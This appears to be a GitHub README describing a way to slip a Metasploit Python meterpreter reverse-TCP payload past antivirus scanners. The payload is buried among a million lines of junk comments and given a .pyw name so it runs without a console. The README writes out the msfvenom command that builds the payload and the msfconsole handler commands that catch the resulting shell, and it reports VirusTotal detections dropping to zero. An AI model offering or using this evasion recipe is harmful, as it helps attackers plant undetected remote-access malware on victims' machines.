# Metasploit-PYEN
<strong><i>A new method of testing the metasploit payload cryptography and its use for cyber experts.</i></strong>
__________________________________________________________________________________________
## [+] Encryption test result :
### [>] From :
![Pic-1](https://raw.githubusercontent.com/AbdulazizDXT/Metasploit-PYEN/main/Pic-1.png)
- Hash : ```0c0ba1c307f2fc0d8de806d406e0dba6d1ee47b9391ad282c4a651a120e3f918```
- -------------------------------------------------------------------------------------
### [>] To :
![Pic-2](https://raw.githubusercontent.com/AbdulazizDXT/Metasploit-PYEN/main/Pic-2.png)
- Hash : ```f5698ec0516a03e9254d802b4ec232bc88ac0381965e64d2037fe1991db5aad3```
- -------------------------------------------------------------------------------------
## The changes :
- It was previously discovered that it contained JavaScript code, and now it has been changed to a text file.
- In VirusTotal statistics, the payload file got (7/60) and after coding, he obtained (0/59).
- The change is to add a million lines of text from this and in the middle of these lines the Python code for the metasploit connection information.
- The Text : ``` #;lwqnbv4;o34vipn34[2qoiqqb54[noi2nb34o[gn3[2ioernvf[o34bgi32olnvcejkvn]]]]] ```
- like this picture :

![Pic-3](https://raw.githubusercontent.com/AbdulazizDXT/Metasploit-PYEN/main/Pic-3.png)
- -------------------------------------------------------------------------------------
## [+] How to create and connect to the payload :
- Use <strong><i>Msfvenom</strong></i> to create a Python payload.
- In <strong><i>root</strong></i> user write this code : ```msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> > Payload.py```.
- Change Output file from ```Payload.py``` to ```Payload.pyw``` --> To Hide the console.
- Add a million lines in the file from this code ```#;lwqnbv4;o34vipn34[2qoiqqb54[noi2nb34o[gn3[2ioernvf[o34bgi32olnvcejkvn]]]]]``` Then put the python payload code in the middle of the million lines in the payload.
- Save the file, now test it in VirusTotal and test it on your device to verify the file.
### [+] Connection test :
- Run <strong><i>Msfconsole</strong></i> tool.
- Put these commands in the terminal of the metsploit tool, and as you know, it will receive your IP address and port.
- Commands :
```
use exploit/multi/handler

set payload python/meterpreter/reverse_tcp

set LHOST <Your IP address>

set LPORT <Your Port>
```
### To start Exploit type :

```exploit```

- Then the connection session opens without problems.

# [+] Supported ME :

BTC : ```bc1qt5wkdh4w6xustsnfaanll4f464t75vncml29cx```












